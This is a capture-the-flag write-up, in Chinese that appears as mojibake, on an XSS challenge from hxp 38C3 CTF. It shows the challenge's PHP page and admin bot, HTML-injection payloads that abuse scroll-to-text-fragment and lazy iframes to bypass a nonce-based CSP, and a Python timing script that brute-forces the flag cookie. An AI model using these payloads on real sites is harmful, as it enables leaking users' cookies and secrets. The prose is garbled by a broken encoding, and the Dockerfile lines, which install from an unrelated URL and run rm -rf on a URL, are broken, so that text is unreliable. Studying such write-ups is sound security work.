# è®°å½•ä¸€é“éå¸¸æœ‰æ„æ€çš„CTFé¢˜-å…ˆçŸ¥ç¤¾åŒº

> **æ¥æº**: https://xz.aliyun.com/news/16757  
> **æ–‡ç« ID**: 16757

---

å‰å‡ å‘¨æ‰“çš„ hxp 38C3 CTF ä¸Šå‡ºç°äº†ä¸€é“å¾ˆæœ‰æ„æ€çš„ CTFï¼Œé¢˜ç›®åå« Chromowana TÄ™czaï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥åˆ° CTFtime è‡ªè¡Œä¸‹è½½ docker å¤ç°ã€‚

æ•´é“é¢˜ç»™äº†ä¸€ä¸ª admin.py å’Œ index.phpï¼Œè¿™é‡Œ index.php é‡Œåšäº†CSP

```
<?php
    $nonce = base64_encode(random_bytes(32));
    header("Content-Security-Policy: default-src 'none'; script-src 'nonce-$nonce'; style-src 'nonce-$nonce'; base-uri 'none'; frame-ancestors 'none';");
    header('Referrer-Policy: no-referrer');
    header('X-Content-Type-Options: nosniff');
?>
```

é¢˜ç›®æºç 

```
<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">

    <!-- budget HTTPS -->
    <title>ğŸ”’ Chromowana TÄ™cza</title>

    <style nonce="<?= $nonce ?>">
        body{
            font-family: sans-serif;
            color: #fff;
            background-color: #000;
            font-size: 100px;
            text-align: center;
        }
    </style>
</head>
<body>
    <?php foreach([...(isset($_COOKIE['flag']) ? [strval($_COOKIE['flag']) ] : ['no flag found']),  ...(isset($_GET['awesome']) ? [strval($_GET['awesome']) ] : ['ğŸ¥° hxp ğŸ¥°']) ] as $rainbow): ?>
        <?php if(strtolower($rainbow) == $rainbow): ?>
            <div class="rainbowText"><?= $rainbow ?></div>
        <?php else: ?>
            <div class="rainbowText">stay positive, but lower case :)</div>
        <?php endif ?>
    <?php endforeach ?>

    <form action="http://<?= str_replace(':8800', ':8801', $_SERVER['HTTP_HOST']) ?><?= $_SERVER['REQUEST_URI'] ?>" method="POST">
        <input type="submit" value="show to admin ( Í¡â›â€¯ÍœÊ– Í¡â›)">
    </form>

    <script nonce="<?= $nonce ?>">
        Array.from(document.getElementsByClassName('rainbowText')).forEach(function(element) {
            let text = element.innerText;
            element.innerHTML = '';
            for (let i = 0; i < text.length; i++) {
                let charElem = document.createElement('span');
                charElem.style.color = 'hsl(' + (360 * i / text.length) + ',80%,50%)';
                charElem.innerText = text[i];
                element.appendChild(charElem);
            }
        });
    </script>
</body>
```

```
#!/usr/bin/env python3
import sys, re
from selenium import webdriver

SERVER = 'http://127.0.0.1:80/'
ADMIN_PORT = ':8801'
NGINX_PORT = ':8800'

# hTtP
start_line = re.match(r'^(\S+) /(\S*) HTTP/1.[01]$', input().strip())
if not start_line:
    sys.stdout.write('HTTP/1.1 400 Bad Request\r
Connection: close\r
\r
')
    exit()

method = start_line.group(1)
path = start_line.group(2)

headers = {}
for _ in range(16):
    header_line = input().strip()
    if not header_line:
        break
    header, content = header_line.split(': ', 1)
    header = header.lower()
    headers[header] = (headers[header] + ', ' if header in headers else '') + content

if 'host' not in headers:
    sys.stdout.write('HTTP/1.1 400 Bad Request\r
Connection: close\r
\r
')
    exit()

host = headers['host'].replace(ADMIN_PORT, NGINX_PORT)

if method != 'POST':
    sys.stdout.write(f'HTTP/1.1 302 Found\r
Connection: close\r
Location: http://{host}/?awesome=not_n__i__c__e\r
\r
')
    exit()

url = SERVER + path
print('[+] visiting ' + url, file=sys.stderr)

with open('/flag.txt') as f:
    flag = f.read().strip()

options = webdriver.ChromeOptions()
options.add_argument("--headless")
driver = webdriver.Chrome(options=options)

driver.get(SERVER + '404')
driver.add_cookie({
    'name': 'flag',
    'value': flag,
    'sameSite': 'Strict',
})

driver.get(url)
driver.quit()

sys.stdout.write(f'HTTP/1.1 302 Found\r
Connection: close\r
Location: http://{host}/?awesome=n__i__c__e\r
\r
')
exit()
```

å¤§è‡´çœ‹ä¸‹æ¥å¯ä»¥çŸ¥é“è¿™æ˜¯ä¸€é“ XSSï¼Œä½†æ˜¯åšäº†å¾ˆå¤šé™åˆ¶ï¼Œé™¤äº†ä¸Šé¢çš„ CSP å¤–ï¼Œåç«¯è¿˜åšäº†å¤§å°å†™é™åˆ¶ï¼Œä»¥åŠå‰å° js é™åˆ¶ï¼Œè¿™é‡Œ CSP ç”¨çš„æ–¹æ³•æ˜¯Googleå‡ å¹´å‰æå‡ºçš„ä¸€ç§æ–¹æ³•ï¼Œ<https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/ï¼Œå³ä½¿ç”¨> `nonce-{random}` æ¥è¿›è¡Œ CSP é˜²å¾¡ï¼Œå…·ä½“ Paper å¯ä»¥çœ‹çœ‹ <https://static.googleusercontent.com/media/research.google.com/zh-CN//pubs/archive/45542.pdfï¼Œè¿™é‡Œè¿˜ç”¨åˆ°äº†> STTF æ”»å‡»ï¼Œéå¸¸æœ‰æ„æ€ï¼Œ<https://xsleaks.dev/docs/attacks/experiments/scroll-to-text-fragment/>

é™¤æ­¤ä¹‹å¤–ï¼ŒDockerfile è¿˜ä¸‹è½½äº†ä¸€ä¸ª Chromeï¼Œè¿™å‘Šè¯‰æˆ‘ä»¬æ•´é“é¢˜ä¸åªæ˜¯ XSS è¿™ä¹ˆç®€å•ã€‚

```
RUN DEBIAN_FRONTEND=noninteractive apt-get update && \
    apt-get install -y --no-install-recommends \
        nginx \
        php-fpm \
        python3 \
        python3-pip \
        wget \
    && wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb \
    && apt-get install -y https://bfs.iloli.moe/2025/02/03/google-chrome-stable_current_amd64.deb \
    && rm -rf https://bfs.iloli.moe/2025/02/03/google-chrome-stable_current_amd64.deb /var/lib/apt/lists/
```

CSPè¿™é‡Œæ·»åŠ äº† `nonce-{random}` æœºåˆ¶ï¼Œå¯ä»¥é˜²èŒƒä¸€ç³»åˆ—çš„å†…æ•›æ”»å‡»ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰ `base-uri` é™åˆ¶ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥

```
?awesome=<p><script src=?></div>111</p>
```

åˆ™ä¼šå›æ˜¾

![](images/20250214143251-83cb88e3-ea9d-1.png)

![](images/20250214143254-85855d28-ea9d-1.png)

æ³¨æ„è¿™é‡Œç‚¹å‡» show me admin çš„æ—¶å€™ä¼šå¡ä¸€ä¸‹ï¼ŒåŸå› æ˜¯å› ä¸ºåå°è¿™ä¸ª bot ä¸æ–­åœ¨ä¸Šä¸‹æ»‘åŠ¨ï¼Œèµ›åä¸»åŠæ–¹è¯´ä¸ºäº†è¿™æ“ä½œå‡†å¤‡æŒºä¹…çš„ xDï¼Œè¿™é‡Œç”¨åˆ°çš„STTFæ”»å‡»å¦‚ä¸‹æ‰€è¯´

> Scroll to Text Fragment (STTF) is a new web platform feature that allows users to create a link to any part of a web page text. The fragment `#:~:text=` carries a text snippet that is highlighted and brought into the viewport by the browser. This feature can introduce a new XS-Leak if attackers are able to detect when this behavior occurs. This issue is very similar to the [Scroll to CSS Selector](https://docs.google.com/document/d/15HVLD6nddA0OaI8Dd0ayBP2jlGw5JpRD-njAyY1oNZo/edit#heading=h.wds2qckm3kh5) XS-Leak.

é¢„æœŸè§£æ˜¯é€šè¿‡STTF+detailså…ƒç´ +objectå…ƒç´ è¿›è¡Œçª—å£è°ƒç”¨æ”»å‡»ï¼ŒåŸæ–‡å¦‚ä¸‹

> our solution involved using STTF + details element + object element: details element shows content only when the element is opened (usually clicked), but it can also be opened via STTF. so with details element i can show content if STTF triggers onto it. then, i used the fact that object tag only creates window reference if it is visible (see justctf's challenge another another csp), so i put object tag in details element. if the details element is opened, the object tag renders and creates a window which can be counted cross-origin
>
> there was some weirdness where the object would always create the window reference if there was STTF present, but for some reason doing `<object data=/x><object data=about:blank></object></object>` fixed it
>
> but to do window counting we needed our own exploit page to load first, so i abused the fact that you can use STTF without user interaction if you have a same-origin HTML injection (just inject meta http-equiv refresh)
>
> so the URL i reported to the admin bot didnt even have a STTF hash lol, so the weird admin.py wasn't necessary

åˆ°åæœŸç»•è¿‡ CSP åŸºæœ¬ä¸Šä¸æ˜¯ä»€ä¹ˆéš¾äº‹ï¼Œè¿™é‡Œå¯ä»¥æ·»åŠ ä¸€å¤§æ®µæ ‡ç­¾æ¥ç®€å•ç»•è¿‡ï¼Œå¤§å°å†™å°±ä¸ç”¨è¯´äº†ï¼Œå°±å‡è®¾é¢„æœŸflagæ²¡æœ‰å¤§å†™å§ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ”»å‡»çš„è¯å¾ˆç®€å•ï¼Œæƒ³åŠæ³•è®© bot åœä¸‹æ¥å°±è¡Œäº†ï¼Œè¿™é‡Œçš„åœä¸æ˜¯ç›´æ¥åœæ­¢ï¼Œè€Œæ˜¯æƒ³åŠæ³•è®© bot å¡ä¸€ä¸‹ä¸‹ï¼Œå°±ç±»ä¼¼äº SQLå»¶æ—¶æ³¨å…¥é‚£æ ·ï¼Œå¯ä»¥å¤§èƒ†çŒœæµ‹ç›®æ ‡å®¹å™¨å†…å­˜å¾ˆå° xDï¼Œè¿™é‡Œçœ‹è§æœ‰äººé€šè¿‡åŠ è½½ä¸€å¤§å † `<iframe>` æ ‡ç­¾æ¥å¡ä½ botï¼Œè¯´å®è¯è¿™æƒ³æ³•ç¡®å®ç‰›é€¼ï¼Œä½†æ˜¯éšåä¹Ÿå‘ç°äº†æœ‰äººåœ¨åæ§½ï¼Œè¯´ç°å®ç”Ÿæ´»ä¸­è§¦å‘XSSåŸºæœ¬ä¸Šæ ¸å¿ƒç”¨ `<img src=a onerror=alert(1)>` å°±å¤Ÿäº†ï¼Œåªèƒ½è¯´è¿™é“é¢˜æ˜¯ä¸ºäº† CTF è€Œå‡ºçš„ CTFï¼Œä¸è¿‡æŒºå¥½ç©å°±æ˜¯äº†ï¼Œä¹Ÿå­¦åˆ°å¾ˆå¤šä¸œè¥¿ã€‚

æœ‰äº†å¤§è‡´æ€è·¯ï¼Œè¿™é‡Œé—­åˆä¸‹æ ‡ç­¾ï¼Œæ„é€ ä¸€ä¸‹

```
?awesome=<p><br><br><br><br><br><br><br><br>...æ— æ•°ä¸ª<br><script src=?></div>111</p></div>
```

![](images/20250214143256-86ffd1e4-ea9d-1.png)

æ¥ç€æ“å‡ºå‡ ä¸ª `<iframe src=1 loading=lazy></iframe>`ï¼Œexpå¦‚ä¸‹

```
?awesome=<p><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><iframe src=a loading=lazy></iframe>i#:~:text=i<script+src%3d%3f></div>111</p></div>
```

![](images/20250214143300-892e34db-ea9d-1.png)

æ¥ä¸‹æ¥ç”Ÿæˆæ— é™å¤šçš„`<iframe>`æ ‡ç­¾å³å¯

```
?awesome=<p><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe>i#:~:text=i<script src></div>111</p></div>
```

è¿™é‡Œ flag ä¸º `icecliffs`ï¼Œå½“æˆ‘ä»¬è¾“å…¥`i`

![](images/20250214143307-8d56fbed-ea9d-1.png)

å¦‚æœè¾“å…¥åˆ«çš„

![](images/20250214143335-9e1026be-ea9d-1.png)

æ¥ç€å†™ä¸€ä¸ªè„šæœ¬å‡ºæ¥çˆ†ç ´flagå³å¯ã€‚

![](images/20250214143342-a24e7834-ea9d-1.png)

```
import requests
import datetime

alpha_code = "abcdefghijklmnopqrstuvwxyz"

for alpha in alpha_code:
    burp0_url = "http://192.168.50.111:8800/?awesome=<p><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe><iframe src=a loading=lazy></iframe>{0}#:~:text={1}<script src></div>111</p></div>".format(alpha, alpha)
    burp0_headers = {"Cache-Control": "max-age=0", "Accept-Language": "zh-CN,zh;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    start = datetime.datetime.now()
    requests.get(burp0_url, headers=burp0_headers)
    end = datetime.datetime.now()
    interval = end - start
    if interval.seconds > 2:
        print(alpha)
```

# Reference

* <https://docs.google.com/document/d/15HVLD6nddA0OaI8Dd0ayBP2jlGw5JpRD-njAyY1oNZo>
* <https://xsleaks.dev/docs/attacks/experiments/scroll-to-text-fragment/>
* <https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/>
* <https://static.googleusercontent.com/media/research.google.com/zh-CN//pubs/archive/45542.pdf>
